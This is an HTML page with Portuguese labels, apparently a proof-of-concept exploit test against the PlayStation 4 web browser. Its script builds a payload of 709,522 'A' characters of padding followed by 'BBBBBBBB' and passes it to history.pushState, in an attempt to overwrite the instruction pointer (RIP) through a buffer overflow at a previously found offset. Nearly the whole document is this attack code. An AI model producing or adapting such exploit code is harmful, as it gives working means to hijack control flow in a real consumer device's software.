<!DOCTYPE html>
<html>
<head>
    <title>PS4 RIP Control Test</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; padding: 30px; text-align: center; }
        button { 
            font-size: 24px; padding: 20px; margin: 20px; cursor: pointer; 
            background: #e67e22; color: white; border: none; font-weight: bold; width: 100%;
        }
        #log { border: 1px solid #555; padding: 20px; margin-top: 20px; color: #f1c40f;}
    </style>
</head>
<body>

    <h1>Teste de Controle de Execução (RIP)</h1>
    <p>Payload: 709.522 'A's (Padding) + 8 'B's (Endereço)</p>

    <div id="log">Pronto.</div>

    <button onclick="injectRIP()">INJETAR ENDEREÇO FALSO (BBBBBBBB)</button>

    <script>
        function injectRIP() {
            const log = document.getElementById('log');
            
            // 1. O OFFSET SEGURO EXATO QUE VOCÊ DESCOBRIU
            const OFFSET = 709522;
            
            // 2. O ENDEREÇO FALSO (8 bytes em arquitetura 64 bits)
            // B = 0x42 em Hexadecimal.
            // Estamos tentando fazer o PS4 pular para 0x4242424242424242
            const RET_ADDR = "BBBBBBBB"; 

            log.innerText = "Construindo payload...";

            setTimeout(() => {
                try {
                    // Padding + Endereço Falso
                    const payload = "/" + "A".repeat(OFFSET) + RET_ADDR;
                    
                    log.innerText = "Enviando payload (" + payload.length + " bytes)...";
                    
                    // Dispara
                    history.pushState({}, "pwn", payload);
                    
                    log.innerText = "Se você está lendo isso, o overwrite falhou ou foi absorvido.";

                } catch (e) {
                    log.innerText = "Erro JS: " + e.message;
                }
            }, 500);
        }
    </script>
</body>
</html>
